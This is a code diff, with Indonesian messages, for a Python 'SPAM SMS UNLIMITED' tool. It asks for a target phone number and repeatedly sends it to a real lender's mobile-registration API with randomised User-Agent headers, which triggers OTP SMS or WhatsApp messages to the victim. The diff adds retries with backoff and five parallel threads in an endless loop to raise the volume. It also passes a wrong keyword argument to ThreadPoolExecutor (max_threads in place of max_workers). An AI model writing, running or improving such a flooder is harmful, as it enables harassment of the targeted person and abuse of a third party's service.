@@ -3,10 +3,15 @@ import json
 import time
 import random
 import uuid
+import logging
 from colorama import Fore, init
 import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 init(autoreset=True)
+
+# Set up logging
+logging.basicConfig(filename='spam_sms.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def autotype(sync):
     for change in sync + "\n":
@@ -69,24 +74,41 @@ def generate_headers():
         "User-Agent": generate_user_agent()
     }
 
-inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")
+def send_request(retry_attempts=5, initial_delay=5):
+    headers_danacita = generate_headers()
+    data_danacita = json.dumps({"username": inputNomer})
+    
+    for attempt in range(retry_attempts):
+        try:
+            response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
+            if response_danacita.status_code == 200:
+                logging.info(f"Berhasil mengirim SMS/WA via Danacita - Attempt {attempt + 1}")
+                print(f"{GreenTerm}Berhasil mengirim SMS/WA via Danacita")
+                return True
+            else:
+                logging.warning(f"Gagal mengirim SMS/WA via Danacita. Status code: {response_danacita.status_code} - Attempt {attempt + 1}")
+        except requests.RequestException as e:
+            logging.error(f"Terjadi kesalahan: {e} - Attempt {attempt + 1}")
+        
+        # Delay dengan backoff eksponensial
+        time.sleep(initial_delay * (2 ** attempt))
+    
+    print(f"{RedTerm}Gagal mengirim SMS setelah {retry_attempts} kali percobaan.")
+    return False
 
-data_danacita = json.dumps({
-    "username": inputNomer,
-})
+inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")
 
 print(f"{WhiteTerm}[{hijau}• SPAM SMS UNLIMITED{kuning}•{hijau}•{WhiteTerm}]")
 
-while True:
-    headers_danacita = generate_headers()
-    try:
-        response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
-        if response_danacita.status_code == 200:
-            print(f"{GreenTerm}Berhasil mengirim SMS/WA via Danacita")
-        else:
-            print(f"{RedTerm}Gagal mengirim SMS/WA via Danacita")
-    except requests.RequestException as e:
-        print(f"{RedTerm}Terjadi kesalahan: {e}")
-    
-    # Delay before sending the next request
-    time.sleep(random.randint(1, 5))  # Delay antara 1 hingga 5 detik
+# Parallel processing parameters
+num_threads = 5
+
+# Using ThreadPoolExecutor for parallel processing
+with ThreadPoolExecutor(max_threads=num_threads) as executor:
+    while True:
+        future_to_request = {executor.submit(send_request): i for i in range(num_threads)}
+        for future in as_completed(future_to_request):
+            future.result()  # This will raise any exceptions
+
+        # Delay before sending the next batch of requests
+        time.sleep(random.randint(10, 20))  # Delay antara 10 hingga 20 detik
